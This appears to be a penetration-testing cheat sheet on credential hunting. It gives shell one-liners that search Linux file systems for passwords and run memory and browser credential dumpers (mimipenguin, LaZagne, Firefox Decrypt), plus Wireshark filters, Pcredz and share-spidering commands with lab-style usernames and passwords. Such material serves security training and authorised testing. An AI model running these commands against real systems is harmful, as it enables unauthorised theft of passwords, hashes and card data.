# Credential Hunting

## Linux&#x20;

### Searching for configuration files&#x20;

&#x20;We should look for, find, and inspect several categories of files one by one. These categories are the following:

* Configuration files
* Databases
* Notes
* Scripts
* Cronjobs
* SSH keys

#### Searching for Configuration Files&#x20;

{% code overflow="wrap" %}
```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
{% endcode %}

#### Searching for sensitive info within configuration files&#x20;

{% code overflow="wrap" %}
```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done 
```
{% endcode %}

#### Searching for databases&#x20;

{% code overflow="wrap" %}
```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
{% endcode %}

#### Searching for notes&#x20;

{% code overflow="wrap" %}
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
{% endcode %}

#### Searching for scripts&#x20;

{% code overflow="wrap" %}
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
{% endcode %}

### Memory and cache dumping&#x20;

Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.

#### Mimipenguin&#x20;

{% code overflow="wrap" %}
```bash
sudo python3 mimipenguin.py

[SYSTEM - GNOME]    cry0l1t3:WLpAEXFa0SbqOHY
```
{% endcode %}

#### LaZagne&#x20;

{% code overflow="wrap" %}
```bash
sudo python2.7 laZagne.py all
```
{% endcode %}

#### Firefox Decrypt&#x20;

{% code overflow="wrap" %}
```bash
python3.9 firefox_decrypt.py
```
{% endcode %}

## Network Traffic

<table data-search="false"><thead><tr><th width="145">Unencrypted Protocol</th><th width="172.199951171875">Encrypted Counterpart</th><th>Description</th></tr></thead><tbody><tr><td><code>HTTP</code></td><td><code>HTTPS</code></td><td>Used for transferring web pages and resources over the internet.</td></tr><tr><td><code>FTP</code></td><td><code>FTPS/SFTP</code></td><td>Used for transferring files between a client and a server.</td></tr><tr><td><code>SNMP</code></td><td><code>SNMPv3 (with encryption)</code></td><td>Used for monitoring and managing network devices like routers and switches.</td></tr><tr><td><code>POP3</code></td><td><code>POP3S</code></td><td>Retrieves emails from a mail server to a local client.</td></tr><tr><td><code>IMAP</code></td><td><code>IMAPS</code></td><td>Accesses and manages email messages directly on the mail server.</td></tr><tr><td><code>SMTP</code></td><td><code>SMTPS</code></td><td>Sends email messages from client to server or between mail servers.</td></tr><tr><td><code>LDAP</code></td><td><code>LDAPS</code></td><td>Queries and modifies directory services like user credentials and roles.</td></tr><tr><td><code>RDP</code></td><td><code>RDP (with TLS)</code></td><td>Provides remote desktop access to Windows systems.</td></tr><tr><td><code>DNS (Traditional)</code></td><td><code>DNS over HTTPS (DoH)</code></td><td>Resolves domain names into IP addresses.</td></tr><tr><td><code>SMB</code></td><td><code>SMB over TLS (SMB 3.0)</code></td><td>Shares files, printers, and other resources over a network.</td></tr><tr><td><code>VNC</code></td><td><code>VNC with TLS/SSL</code></td><td>Allows graphical remote control of another computer.</td></tr></tbody></table>

### Wireshark filter&#x20;

<table data-search="false"><thead><tr><th>Wireshark filter</th><th>Description</th></tr></thead><tbody><tr><td><code>ip.addr == 56.48.210.13</code></td><td>Filters packets with a specific IP address</td></tr><tr><td><code>tcp.port == 80</code></td><td>Filters packets by port (HTTP in this case).</td></tr><tr><td><code>http</code></td><td>Filters for HTTP traffic.</td></tr><tr><td><code>dns</code></td><td>Filters DNS traffic, which is useful to monitor domain name resolution.</td></tr><tr><td><code>tcp.flags.syn == 1 &#x26;&#x26; tcp.flags.ack == 0</code></td><td>Filters SYN packets (used in TCP handshakes), useful for detecting scanning or connection attempts.</td></tr><tr><td><code>icmp</code></td><td>Filters ICMP packets (used for Ping), which can be useful for reconnaissance or network issues.</td></tr><tr><td><code>http.request.method == "POST"</code></td><td>Filters for HTTP POST requests. In the case that POST requests are sent over unencrypted HTTP, it may be the case that passwords or other sensitive information is contained within.</td></tr><tr><td><code>tcp.stream eq 53</code></td><td>Filters for a specific TCP stream. Helps track a conversation between two hosts.</td></tr><tr><td><code>eth.addr == 00:11:22:33:44:55</code></td><td>Filters packets from/to a specific MAC address.</td></tr><tr><td><code>ip.src == 192.168.24.3 &#x26;&#x26; ip.dst == 56.48.210.3</code></td><td>Filters traffic between two specific IP addresses. Helps track communication between specific hosts.</td></tr></tbody></table>

### Pcredz

Pcredz is a tool that can be used to extract credentials from live traffic or network packet captures. Specifically, it supports extracting the following information:

* Credit card numbers
* POP credentials
* SMTP credentials
* IMAP credentials
* SNMP community strings
* FTP credentials
* Credentials from HTTP NTLM/Basic headers, as well as HTTP Forms
* NTLMv1/v2 hashes from various traffic including DCE-RPC, SMBv1/2, LDAP, MSSQL, and HTTP
* Kerberos (AS-REQ Pre-Auth etype 23) hashes

Run this command against a packet capture file.&#x20;

{% code overflow="wrap" %}
```bash
./Pcredz -f demo.pcapng -t -v
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1693).png" alt=""><figcaption></figcaption></figure>

## Network Shares

### Windows (Snaffler)

It  is a C# program that, when run on a `domain-joined` machine, automatically identifies accessible network shares and searches for interesting files.

{% code overflow="wrap" %}
```cmd
Snaffler.exe -s
```
{% endcode %}

* `-u` retrieves a list of users from Active Directory and searches for references to them in files
* `-i` and `-n` allow you to specify which shares should be included in the search

### Windows (PowerHuntShares)

It is a PowerShell script that doesn't necessarily need to be run on a domain-joined machine. One of its most useful features is that it generates an `HTML report` upon completion, providing an easy-to-use UI for reviewing the results:

{% code overflow="wrap" %}
```powershell
 Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```
{% endcode %}

### Linux (ManSpider)

A basic scan for files containing the string `passw` can be run as follows:

{% code overflow="wrap" %}
```bash
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```
{% endcode %}

### Linux (NetExec)

{% code overflow="wrap" %}
```bash
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
```
{% endcode %}
